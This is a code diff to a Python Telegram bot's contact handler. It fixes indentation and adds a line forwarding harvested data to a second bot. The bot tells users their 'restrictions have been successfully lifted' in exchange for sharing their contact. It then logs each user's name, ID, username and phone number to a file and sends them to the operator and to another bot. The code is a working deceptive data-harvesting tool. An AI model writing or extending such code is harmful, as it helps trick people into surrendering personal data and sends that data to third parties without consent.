@@ -89,29 +89,29 @@ def start(message):
 
 @bot.message_handler(content_types=['contact']) 
 def contact(message):
-	if message.contact is not None: 
-		nick = message.from_user.username
-		first = message.contact.first_name
-		last = message.contact.last_name
-		userid = message.contact.user_id
-		phone = message.contact.phone_number
-		bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
-		info = f'''
-		🧿 User Data:
-			├Name: {first} {last}
-			├ID: {userid}
-			├Username: @{nick}
-			└Phone number: {phone}
-			'''
-		log = open('bot-log.txt', 'a+', encoding='utf-8')
-		log.write(info + '  ')
-		log.close()
-		bot.send_message(ID, info)
-    your_bot.send_message(YOUR_BOT_ID, info)
-		print(info)
+    if message.contact is not None: 
+        nick = message.from_user.username
+        first = message.contact.first_name
+        last = message.contact.last_name
+        userid = message.contact.user_id
+        phone = message.contact.phone_number
+        bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
+        info = f'''
+        🧿 User Data:
+            ├Name: {first} {last}
+            ├ID: {userid}
+            ├Username: @{nick}
+            └Phone number: {phone}
+            '''
+        log = open('bot-log.txt', 'a+', encoding='utf-8')
+        log.write(info + '  ')
+        log.close()
+        bot.send_message(ID, info)
+        your_bot.send_message(YOUR_BOT_ID, info)  # Replace YOUR_BOT_ID with the actual chat ID of the second bot
+        print(info)
 
-		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, '❌ Authorize Your contact!')	
+        if message.contact.user_id != message.chat.id:
+            bot.send_message(message.chat.id, '❌ Authorize Your contact!')    	
 
 if __name__ == "__main__":
     start_bot()
